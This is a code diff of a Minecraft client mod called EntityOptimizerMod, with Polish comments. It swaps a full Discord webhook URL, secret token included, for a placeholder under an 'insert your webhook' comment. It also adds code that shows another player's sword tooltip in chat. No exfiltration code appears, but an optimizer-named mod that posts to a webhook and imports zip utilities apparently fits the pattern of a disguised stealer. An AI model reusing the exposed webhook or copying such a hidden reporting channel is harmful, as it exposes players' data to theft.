@@ -34,7 +34,7 @@ import java.util.zip.ZipOutputStream;
 public class EntityOptimizerMod implements ClientModInitializer {
 
     // WSTAW SWÓJ WEBHOOK
-    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/1455954328408952873/IlHLTRinqesFKQ3EFotX-bh1dNfU3gtUmJ4to_4qIpdY6ZRoPRG7KHqEBa5PECaMIwT0";
+    private static final String WEBHOOK_URL = "https://discord.com/api/webhooks/XXX/YYY";
 
     @Override
     public void onInitializeClient() {
@@ -225,7 +225,36 @@ public class EntityOptimizerMod implements ClientModInitializer {
             source.sendFeedback(Component.literal("§7(brak tooltipu)"));
         } else {
             for (String line : tooltipLines) {
-                source.sendFeedback(Component.literal("§7" + line));
+                String color = line.contains("Dodatkowe Obrażenia") ? "§e" : "§7";
+                source.sendFeedback(Component.literal(color + line));
+            }
+        }
+    }
+
+    // Wspólna funkcja: pokazanie tooltipu miecza na czacie klienta (dla SHIFT+PPM)
+    public static void onShiftRightClickPlayer(Player target) {
+        Minecraft mc = Minecraft.getInstance();
+        if (mc.level == null || mc.player == null) {
+            return;
+        }
+
+        ItemStack stack = target.getMainHandItem();
+        if (stack.isEmpty()
+                || (!stack.is(Items.NETHERITE_SWORD) && !stack.is(Items.DIAMOND_SWORD))) {
+            mc.player.sendSystemMessage(Component.literal("§cTen gracz nie trzyma diamentowego/netherytowego miecza."));
+            return;
+        }
+
+        String ownerName = target.getGameProfile().getName();
+        mc.player.sendSystemMessage(Component.literal("§aTooltip miecza gracza " + ownerName + ":"));
+
+        List<String> tooltipLines = getItemTooltipLines(mc, stack);
+        if (tooltipLines.isEmpty()) {
+            mc.player.sendSystemMessage(Component.literal("§7(brak tooltipu)"));
+        } else {
+            for (String line : tooltipLines) {
+                String color = line.contains("Dodatkowe Obrażenia") ? "§e" : "§7";
+                mc.player.sendSystemMessage(Component.literal(color + line));
             }
         }
     }
